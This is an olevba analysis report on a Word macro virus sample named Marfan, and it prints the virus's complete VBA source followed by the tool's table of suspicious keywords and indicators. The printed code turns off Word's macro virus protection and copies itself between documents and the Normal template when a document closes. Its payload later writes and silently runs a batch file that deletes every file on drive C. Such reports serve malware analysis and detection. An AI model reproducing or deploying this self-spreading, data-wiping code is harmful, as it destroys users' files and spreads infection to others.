olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marfan-a050050317d04614c51d273c6c914ceb26988e28
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marfan-a050050317d04614c51d273c6c914ceb26988e28 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'MarfanSyndrome!

On Error GoTo skammy

' Disable That Pesky This Document Has Macros Features
Options.VirusProtection = False

' 50% Chance of Parent Passing the Disease to Children
Randomize
If Int(2 * Rnd) = 1 Then
    Marfan_Syndrome
End If

skammy:
End Sub
 
'Copy From This Macro From The Normal Template to the Active Document
Private Sub Marfan_Syndrome()
If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
        lineofcode = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
        ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
     Next I
    ' Run The Payload
    PayLoad
    ' Save it
    ActiveDocument.SaveAs AddToRecentFiles:=False
Else
'Copy This Macro From The Active Document to the Normal Template
If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
        lineofcode = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
        NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
    Next I
    ' Save It
    NormalTemplate.Save
End If
End If
End Sub

Private Sub PayLoad()

Symptoms = 0
SymptomsString = "Symptoms Found\n-------------\n"

' Is the Document Abnormally Tall?
If ActiveDocument.PageSetup.PageHeight > 720 Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Document Was Abnormally Tall (Long)\n"
End If

' A Large Font Could Be A Sign Of Extreme NearsightedneSymptomsString
If ActiveDocument.Range(Start:=0, End:=1).Font.Size > 12 Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Document Showed Signs of NearsightedneSymptomsString\n"
End If

' Flat Feet is Another Bad Sign
With ActiveDocument.Sections(1).Footers(wdHeaderFooterPrimary)
    If .Range.Text = vbCr Then
        Symptoms = Symptoms + 1
        SymptomsString = SymptomsString + "Your Document Had Flat Feet\n"
    End If
End With

' User Didnt Type That Much... Bad Joints?
If ActiveDocument.Words.Count < 100 Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Possible Bad Joints Were Detected\n"
End If
       
' No MathCoPorceSymptomsStringor!  User probably feels Chest Pains.
If System.MathCoprocessorInstalled = False Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Computer Does Not Have A MathCoProceSymptomsStringor (Chest Pains)\n"
End If

' Bad Posture or Slouching is a Big Tipoff!
If ActiveDocument.PageSetup.BottomMargin <> ActiveDocument.PageSetup.TopMargin Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Document Showed Signs of Slouching or Bad Posture\n"

End If

' Abnormally Long Arms or Legs is A Symptom
If ActiveDocument.PageSetup.LeftMargin > 90 Or ActiveDocument.PageSetup.BottomMargin > 72 Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Document Showed Signs of Long Arms or Legs\n"
End If
    
' A High Palette in the Mouth Could be a Clue
If ActiveDocument.PageSetup.TopMargin > 72 Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Document Showed Signs of a High Palette\n"
End If
    
' Marfan Recommends Thorough Checkups If You Have More Than 2 Symptoms!
If Symptoms > 2 Then

    ' Have We Created The Batch Files Yet?
    With Application.FileSearch
        .NewSearch
        .LookIn = "c:\"
        .SearchSubFolders = False
        .fileName = "marfan.bat"
        .MatchTextExactly = True
    End With
    
    ' We have Already Warned The User
    If Application.FileSearch.Execute() > 0 Then
        ' Marfan Usually Strikes In the Early 30's
        If DateDiff("d", FileDateTime("c:\marfan.html"), Now) > 30 Then
            ' Lets Be Nice and Warn The User
            MsgBox "Your Computer Is Experiencing an Aortic Dissection!"
            MsgBox "You Have 2 Minutes To Get To The Hospital!"
            MsgBox "I Would Recommend Rebooting!"
            'Create A Batch File That Deletes Everything Not Running!
            Open "c:\marfan.bat" For Output As #1
                Print #1, "del /S /F /Q c:\*.*"
            Close #1
            ' Wait 2 Minutes
            countdown = Now
            While DateDiff("s", countdown, Now) < 120
            Wend
            ' Run That Batch File!
            vResult = Shell("c:\marfan.bat", vbHide)
         End If
    Else
    ' The User Has Deleted or The Batch File Has Never Been Created
    ' Create a Batch That Loads an Html Page
    Open "c:\marfan.bat" For Output As #1
        Print #1, "c:\marfan.html"
    Close #1
    ' Create The Html Page
    Open "c:\marfan.html" For Output As #1
        Print #1, "<HTML>        "
        Print #1, "<META HTTP-EQUIV=" & Chr$(34) & "Refresh" & Chr$(34) & " CONTENT=" & Chr$(34) & "0;URL=http://www.marfan.org" & Chr$(34) & ">"
        Print #1, "<SCRIPT LANGUAGE=" & Chr$(34) & "JavaScript" & Chr$(34) & ">"
        Print #1, "document.open(" & Chr$(34) & "http://www.marfan.org" & Chr$(34) & ");"
        Print #1, "alert('Attention!  Word Is Infected With Marfan Syndrome!\nIf Left Untreated an Aortic Dissection Could Occur!');"
        Print #1, "alert('" & SymptomsString & "');"
        Print #1, "</SCRIPT>"
        Print #1, "<BODY>"
        Print #1, "</BODY>"
        Print #1, "</HTML>"
     Close #1
     ' Run That Batch File!
     vResult = Shell("c:\marfan.bat", vbHide)

    End If
End If
  
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://www.marfan.or|URL                                          |
|          |g                   |                                             |
|IOC       |marfan.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

